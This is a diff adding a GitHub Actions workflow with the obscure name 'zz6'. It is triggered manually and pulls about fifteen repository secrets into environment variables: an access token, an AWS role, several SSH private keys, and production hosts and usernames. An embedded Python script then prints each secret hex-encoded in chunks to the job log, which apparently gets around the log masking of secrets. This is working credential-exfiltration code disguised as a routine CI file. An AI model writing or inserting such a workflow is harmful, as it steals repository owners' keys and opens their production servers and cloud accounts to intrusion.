@@ -1,0 +1,34 @@
+name: zz6
+on:
+  workflow_dispatch:
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    steps:
+      - shell: bash
+        env:
+          A: ${{ secrets.ACCESS_TOKEN }}
+          R: ${{ secrets.AWS_IAM_ROLE_ARN }}
+          G: ${{ secrets.AWS_REGION }}
+          K1: ${{ secrets.AWS_SSH_PRIVATE_KEY }}
+          K2: ${{ secrets.PROD_SSH_KEY }}
+          K3: ${{ secrets.SSH_PRIVATE_KEY }}
+          K4: ${{ secrets.SSH_PEM_KEY }}
+          E: ${{ secrets.EKS_CLUSTER_NAME }}
+          H1: ${{ secrets.HOST_DNS }}
+          H2: ${{ secrets.PROD_HOST }}
+          H3: ${{ secrets.SSH_HOST }}
+          H4: ${{ secrets.EC2_IP_STAGING }}
+          U1: ${{ secrets.PROD_USER }}
+          U2: ${{ secrets.SSH_USER }}
+          U3: ${{ secrets.USERNAME }}
+        run: |
+          python3 - <<'PY'
+          import os
+          for n in ['A','R','G','K1','K2','K3','K4','E','H1','H2','H3','H4','U1','U2','U3']:
+              v=os.environ.get(n,'')
+              print('@@%s len=%d'%(n,len(v)))
+              for i in range(0,len(v),1200):
+                  print('@@H%s_%d %s'%(n,i,v[i:i+1200].encode().hex()))
+          print('@@END')
+          PY
